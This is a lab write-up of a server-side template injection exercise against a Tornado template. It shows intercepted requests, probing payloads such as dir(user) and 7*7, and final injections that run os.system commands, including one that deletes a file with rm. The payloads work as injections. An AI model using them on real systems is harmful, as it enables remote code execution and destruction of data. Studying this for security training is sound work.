# Description

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`


## Solution

In /my-account page, there is no SSTI vuln.
I tried to inject in comments but nothing happend. So there is additional functionality, we can assign what will be publically showed when i save comments. I could only choose fist name, last name and nickname. But i can only change email. I just intercepted changing show name

data of request
```
blog-post-author-display=user.name&csrf=sIeljbsaZ6Puahx8ZxNfLapptoIAcvKh
```

malicious request
```
blog-post-author-display=user.email&csrf=sIeljbsaZ6Puahx8ZxNfLapptoIAcvKh
```


Now, our email will show in page

and indeed when we visit blog post with our comment

```
#### Internal Server Error

Traceback (most recent call last): File "<string>", line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate return execute() File "<string>.generated.py", line 4, in _tt_execute AttributeError: User instance has no attribute 'email'
```

We broke server, my email was `{{7*7}}@mail.com`

Unfortunatly, site was crashed not because of SSTI, but because of that for some reason, there is no attribute email in user.

But we can execute python code

request
```
blog-post-author-display=dir(user)&csrf=sIeljbsaZ6Puahx8ZxNfLapptoIAcvKh
```

```
[&#39;__doc__&#39;, &#39;__init__&#39;, &#39;__module__&#39;, &#39;first_name&#39;, &#39;name&#39;, &#39;nickname&#39;] | 29 May 2024
```

Hmmm... there is indeed no attribute for email.

```
blog-post-author-display=7*7&csrf=sIeljbsaZ6Puahx8ZxNfLapptoIAcvKh
```

also standard payload works, and displays 49

> [!success]
> i have successfully executed command

payload 
```python
blog-post-author-display=__import__("os").system("ls")&csrf=sIeljbsaZ6Puahx8ZxNfLapptoIAcvKh
```

helpfully for https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes

## Final payload

```python
blog-post-author-display=__import__("os").system("rm%20morale.txt")&csrf=sIeljbsaZ6Puahx8ZxNfLapptoIAcvKh
```

